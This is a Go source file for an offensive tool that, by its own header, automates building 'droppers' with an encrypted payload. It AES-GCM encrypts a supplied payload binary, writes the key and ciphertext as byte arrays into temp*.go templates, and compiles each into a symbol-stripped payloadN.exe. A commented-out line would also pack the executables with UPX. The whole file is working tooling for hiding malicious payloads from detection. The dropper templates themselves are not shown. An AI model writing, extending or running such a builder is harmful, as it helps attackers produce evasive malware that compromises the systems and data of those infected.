// Automated build of multiple droppers with an encrypted payload
// Starting from pay2goaes base

package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
)

const (
	KeyFlag     uint = 0
	PayloadFlag uint = 1
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func encryptAES(plaintext []byte, key []byte) (ciphertext []byte) {
	c, err := aes.NewCipher(key)
	check(err)
	gcm, err := cipher.NewGCM(c)
	check(err)

	nonce := make([]byte, gcm.NonceSize())

	_, err = io.ReadFull(rand.Reader, nonce)
	check(err)

	ciphertext = gcm.Seal(nonce, nonce, plaintext, nil)
	return
}

func fPrintPayString(seal []byte, flag uint) (fPayload string) {
	fPayload = ""
	form := "0x%s"
	end := ", "
	if flag == PayloadFlag {
		fPayload += "var buf = []byte { \n\t"
	} else if flag == KeyFlag {

		fPayload += "var key = []byte { \n\t"
	}
	for i, s := range seal {
		if i == (len(seal) - 1) {
			end = ""
		}
		fPayload += fmt.Sprintf(form, strconv.FormatInt(int64(s), 16)) + end

		if (i%16 == 15) || (end == "") {
			if end != "" {
				fPayload += "\n\t"
			}
		}

	}

	fPayload += "} \n\n"
	return

}

func buildExe(fPath string, index int, env []string, wg *sync.WaitGroup) {
	//aPath := strings.Split(fPath, "/")

	//gCache := "GOCACHE" + build.Default.
	outFile := fmt.Sprintf("payload%s.exe", fmt.Sprint(index))

	cmd := exec.Command("go", "build", "-o", outFile, "-ldflags=-w -s", fPath)
	cmd.Env = env

	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("failed to build, err:", err.Error())
	}
	fmt.Println(string(out))

	//cmd2 := exec.Command("upx", "--brute", fmt.Sprintf("payload%s.exe", fmt.Sprint(index)))
	//cmd2.Run()

	wg.Done()

}

func main() {
	var eKey []byte
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("\n---\nGolang AES Payload Encryption v1.0\n---\n")
	args := os.Args[1:]

	if len(args) == 0 {
		fmt.Printf("Usage: %s ~/payload.bin <OPTIONAL32BYTEKEY>", os.Args[0])
		os.Exit(0)
	} else if len(args) == 1 {
		eKey = make([]byte, 32)
		_, err := rand.Read(eKey)
		check(err)
	} else if len(args) == 2 {
		eKey = []byte(args[1])
		if len(eKey) != 32 {
			panic("error: key is not 32 bytes")
		}
	} else {
		panic("error: incorrect number of arguments")
	}

	fPath := args[0]

	binFile, err := os.ReadFile(fPath)
	check(err)

	ciphertext := encryptAES(binFile, eKey)

	k2w := fPrintPayString(eKey, KeyFlag)
	p2w := fPrintPayString(ciphertext, PayloadFlag)

	// fmt.Println(k2w)
	// fmt.Println(p2w)

	cd, _ := os.Getwd()

	var files []string

	err = filepath.Walk(cd, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println(err)
			return nil
		}

		if !info.IsDir() && filepath.Ext(path) == ".go" && info.Name()[0:4] == "temp" {
			files = append(files, path)
		}
		return nil
	})
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		fmt.Println(file)
	}

	fmt.Print("Is this the correct list of files to build?")
	fmt.Print(" y/n > ")
	res, _ := reader.ReadString('\n')
	fmt.Println(res)
	if res[0:1] != "y" {
		fmt.Println("exiting...")
		os.Exit(0)
	}

	cmd := exec.Command("go", "env")
	out, err := cmd.Output()
	check(err)

	env := strings.Split(string(out), "\n")
	for _, thing := range env {
		//line := strings.Replace(thing, "\"", "", -1)
		fmt.Println(thing)
	}

	wg := sync.WaitGroup{}

	for i, fPath := range files {
		read, err := ioutil.ReadFile(fPath)
		if err != nil {
			panic(err)
		}
		//fmt.Println(string(read))
		//fmt.Println(fPath)

		newContents := strings.Replace(string(read), "<PAYLOAD>", p2w, -1)
		newContents = strings.Replace(newContents, "<KEY>", k2w, -1)

		//fmt.Println(newContents)
		nPath := fPath[:len(fPath)-3] + ".LOADED" + ".go"

		err = ioutil.WriteFile(nPath, []byte(newContents), 0644)
		if err != nil {
			panic(err)
		}

		wg.Add(1)
		go buildExe(nPath, i, env, &wg)
	}
	wg.Wait()
}
